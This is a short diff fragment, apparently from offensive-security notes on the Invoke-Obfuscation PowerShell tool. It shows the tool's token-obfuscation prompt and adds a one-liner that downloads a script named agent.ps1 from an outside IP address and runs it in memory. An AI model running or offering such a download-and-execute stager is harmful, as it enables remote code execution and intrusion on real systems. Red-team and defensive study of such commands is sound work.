@@ -60,3 +60,8 @@ Choose one of the below Token\All options to APPLY to current payload:
 
 Invoke-Obfuscation\Token\All> 1
 ```
+
+
+```powershell
+powershell.exe -NoP -c 'iex(iwr http://192.168.2.228:8081/agent.ps1 -useb)'
+```
